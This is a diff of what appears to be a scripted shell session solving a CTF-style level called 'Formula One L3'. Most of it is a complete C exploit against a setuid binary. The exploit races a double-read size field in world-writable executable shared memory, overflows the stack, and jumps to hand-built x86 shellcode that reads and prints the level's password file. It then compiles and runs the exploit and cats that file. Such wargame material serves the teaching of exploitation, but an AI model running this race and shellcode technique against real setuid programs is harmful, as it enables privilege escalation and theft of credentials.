@@ -1,84 +1,76 @@
 @sleep 1
 id
-echo '# Formula One L3: /formulaone/formulaone3 (setuid formulaone3):'
 cat /formulaone/formulaone3.c
-echo '# doecho reads echo->sz TWICE: once for the cmp 0xff check, once for the memcpy'
-echo '# size, with puts() between. We own the 0777 shm (SHM_EXEC = RWX); a toggler'
-echo '# flips sz 10 <-> 0x400: the check passes while memcpy smears 1KB over the stack.'
-echo '# Saved EIP points at shellcode in the RWX shm (ret2shm, ASLR off).'
-echo '# Writing the attack (heredoc, code visible):'
-@line cat > /tmp/f1l3.c <<'CEOF'
-@line #include <stdio.h>
-@line #include <stdlib.h>
-@line #include <string.h>
-@line #include <unistd.h>
-@line #include <sys/ipc.h>
-@line #include <sys/shm.h>
-@line #include <sys/wait.h>
-@line #include <signal.h>
-@line struct msg { int sz; char ptr[1024]; };
-@line int main(int argc, char **argv) {
-@line     unsigned int shmkey = strtoul(argv[1], 0, 0);
-@line     unsigned int shmaddr = strtoul(argv[2], 0, 0);
-@line     int sc_off = 0x200;
-@line     int shmid = shmget(shmkey, 8192, IPC_CREAT | 0777);
-@line     if (shmid < 0) { perror("shmget"); return 1; }
-@line     struct msg *m = shmat(shmid, NULL, 0);
-@line     if (m == (void*)-1) { perror("shmat"); return 1; }
-@line     memset(m->ptr, 'A', 1024);
-@line     *(unsigned int *)(m->ptr + 0x110) = shmaddr + sc_off;
-@line     {   /* shellcode: open/read/write /etc/formulaone_pass/formulaone3 -> fd 1 */
-@line         char *path = "/etc/formulaone_pass/formulaone3";
-@line         int len = strlen(path), off = 0;
-@line         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC0;
-@line         m->ptr[sc_off + off++] = 0x50;
-@line         for (int c = len - 4; c >= 0; c -= 4) {
-@line             m->ptr[sc_off + off++] = 0x68;
-@line             for (int k = 0; k < 4; k++)
-@line                 m->ptr[sc_off + off++] =
-@line                     (c + k < len) ? path[c + k] : 0;
-@line         }
-@line         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE3;
-@line         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC9;
-@line         m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x05;
-@line         m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
-@line         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC3;
-@line         m->ptr[sc_off + off++] = 0x83; m->ptr[sc_off + off++] = 0xEC;
-@line         m->ptr[sc_off + off++] = 0x40;
-@line         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;
-@line         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xD2;
-@line         m->ptr[sc_off + off++] = 0xB2; m->ptr[sc_off + off++] = 0x21;
-@line         m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x03;
-@line         m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
-@line         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;
-@line         m->ptr[sc_off + off++] = 0xB3; m->ptr[sc_off + off++] = 0x01;
-@line         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;
-@line         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC2;
-@line         m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x04;
-@line         m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
-@line         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;
-@line         m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x01;
-@line         m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
-@line     }
-@line     pid_t t = fork();
-@line     if (t == 0) { while (1) { m->sz = 10; m->sz = 0x400; } }
-@line     for (int round = 0; round < 400; round++) {
-@line         pid_t p = fork();
-@line         if (p == 0) {
-@line             execl("/formulaone/formulaone3", "formulaone3", "a", (char*)0);
-@line             _exit(127);
-@line         }
-@line         waitpid(p, NULL, 0);
-@line     }
-@line     kill(t, SIGKILL);
-@line     return 0;
-@line }
-@line CEOF
-cd /tmp && gcc f1l3.c -o f1l3
-echo '# run at the swept shm base 0xf7fb9000; password comes out clean:'
-timeout 100 /tmp/f1l3 0xADC00ADC 0xf7fb9000 2>/dev/null | grep -aE "^[A-Za-z0-9]{20,}" | head -1
-echo rc=$?
-echo '# Verify (we are formulaone3 after the ssh login):'
+mkdir -p /run/screen/f3 && cd /run/screen/f3
+@vi /run/screen/f3/f1l3.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#include <sys/wait.h>
+#include <signal.h>
+struct msg { int sz; char ptr[1024]; };
+int main(int argc, char **argv) {
+    unsigned int shmkey = strtoul(argv[1], 0, 0);
+    unsigned int shmaddr = strtoul(argv[2], 0, 0);
+    int sc_off = 0x200;
+    int shmid = shmget(shmkey, 8192, IPC_CREAT | 0777);
+    if (shmid < 0) { perror("shmget"); return 1; }
+    struct msg *m = shmat(shmid, NULL, 0);
+    if (m == (void*)-1) { perror("shmat"); return 1; }
+    memset(m->ptr, 'A', 1024);
+    *(unsigned int *)(m->ptr + 0x110) = shmaddr + sc_off;
+    {   /* shellcode: open/read/write /etc/formulaone_pass/formulaone3 -> fd 1 */
+        char *path = "/etc/formulaone_pass/formulaone3";
+        int len = strlen(path), off = 0;
+        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC0;
+        m->ptr[sc_off + off++] = 0x50;
+        for (int c = len - 4; c >= 0; c -= 4) {
+            m->ptr[sc_off + off++] = 0x68;
+            for (int k = 0; k < 4; k++)
+                m->ptr[sc_off + off++] =
+                    (c + k < len) ? path[c + k] : 0;
+        }
+        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE3;
+        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC9;
+        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x05;
+        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
+        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC3;
+        m->ptr[sc_off + off++] = 0x83; m->ptr[sc_off + off++] = 0xEC;
+        m->ptr[sc_off + off++] = 0x40;
+        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;
+        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xD2;
+        m->ptr[sc_off + off++] = 0xB2; m->ptr[sc_off + off++] = 0x21;
+        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x03;
+        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
+        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;
+        m->ptr[sc_off + off++] = 0xB3; m->ptr[sc_off + off++] = 0x01;
+        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;
+        m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC2;
+        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x04;
+        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
+        m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;
+        m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x01;
+        m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;
+    }
+    pid_t t = fork();
+    if (t == 0) { while (1) { m->sz = 10; m->sz = 0x400; } }
+    for (int round = 0; round < 400; round++) {
+        pid_t p = fork();
+        if (p == 0) {
+            execl("/formulaone/formulaone3", "formulaone3", "a", (char*)0);
+            _exit(127);
+        }
+        waitpid(p, NULL, 0);
+    }
+    kill(t, SIGKILL);
+    return 0;
+}
+@viend
+gcc /run/screen/f3/f1l3.c -o /run/screen/f3/f1l3
+timeout 100 /run/screen/f3/f1l3 0xADC00ADC 0xf7fb9000 2>/dev/null | grep -aE '^[A-Za-z0-9]{20,}' | head -1
 cat /etc/formulaone_pass/formulaone3
 @sleep 2
 exit
